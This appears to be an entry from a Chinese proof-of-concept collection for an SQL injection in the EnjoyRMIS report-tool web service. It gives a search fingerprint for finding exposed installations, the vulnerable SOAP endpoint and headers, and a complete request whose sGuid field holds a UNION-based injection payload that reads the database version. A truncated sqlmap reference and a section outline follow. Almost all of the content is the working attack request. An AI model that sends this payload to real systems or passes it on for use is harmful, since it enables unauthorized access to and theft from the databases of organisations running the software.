# EnjoyRMISGetChildGroupSql1存在SQL注入漏洞

- **系统**：EnjoyRMISGetChildGroupSql1　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="CheckSilverlightInstalled"`
- **请求**：`POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetChildGroupSql1"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetChildGroupSql1 xmlns="http://tempuri.org/">
<sGuid>1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select @@version),NULL,NULL-- jhpF</sGuid>
</GetChildGroupSql1>
</soap:Body>
</soap:Envelope>

sqlmap
POST /EnjoyRMIS_WS/…（脚本共 1109 字，完整版见原文）
```

**其他**
- EnjoyRMIS GetChildGroupSql1存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * EnjoyRMIS